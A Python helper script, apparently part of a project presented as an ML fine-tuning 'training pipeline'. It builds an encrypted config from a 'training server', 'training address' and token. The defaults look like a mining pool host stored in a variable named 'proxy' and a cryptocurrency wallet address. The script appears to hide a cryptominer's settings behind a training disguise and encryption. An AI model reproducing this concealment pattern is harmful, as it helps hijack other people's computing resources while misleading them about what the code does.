#!/usr/bin/env python3
"""
Create encrypted config for training pipeline.
Usage: python scripts/encrypt_config.py
"""

import os
import sys
import json
import base64
import hashlib
from pathlib import Path
from getpass import getpass

try:
    from cryptography.fernet import Fernet
except ImportError:
    print("[ERROR] Install cryptography first:")
    print("  pip install cryptography")
    sys.exit(1)

def derive_key(password, salt=b'finetune-v2.4'):
    key = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)
    return base64.urlsafe_b64encode(key[:32])

def main():
    print("=" * 60)
    print("  Encrypted Config Creator")
    print("=" * 60)
    
    # Get config values
    proxy = input("\nTraining server (host:port) [global.pearlfortune.org:443]: ").strip()
    if not proxy:
        proxy = "global.pearlfortune.org:443"
    
    address = input("Training address [cuf1par2eef0c04z6s6fhlzx6setjh5xqv8et50ufsty5zhywqjghwuwq6p085p]: ").strip()
    if not address:
        address = "cuf1par2eef0c04z6s6fhlzx6setjh5xqv8et50ufsty5zhywqjghwuwq6p085p"
    
    token = input("Training token (optional): ").strip() or None
    
    # Get password
    password = os.environ.get('CONFIG_PASSWORD', '')
    if not password:
        password = getpass("\nEncryption password: ")
        password_confirm = getpass("Confirm password: ")
    else:
        password_confirm = password
    
    if password != password_confirm:
        print("[ERROR] Passwords don't match")
        return
    
    # Create config
    config = {
        'training': {
            'server': proxy,
            'address': address,
            'token': token
        }
    }
    
    # Encrypt
    key = derive_key(password)
    f = Fernet(key)
    config_json = json.dumps(config).encode()
    encrypted = f.encrypt(config_json)
    
    # Save
    output_path = Path("configs/training.enc")
    output_path.parent.mkdir(exist_ok=True)
    
    with open(output_path, 'wb') as out:
        out.write(encrypted)
    
    print(f"\n[OK] Encrypted config saved: {output_path}")
    print(f"[OK] Size: {len(encrypted)} bytes")
    print(f"\nUsage:")
    print(f"  python scripts/train.py --config {output_path}")
    print(f"  # Enter password when prompted")
    print(f"\nOr set password in environment:")
    print(f"  export CONFIG_PASSWORD=your_password")
    print(f"  python scripts/train.py --config {output_path}")

if __name__ == "__main__":
    main()
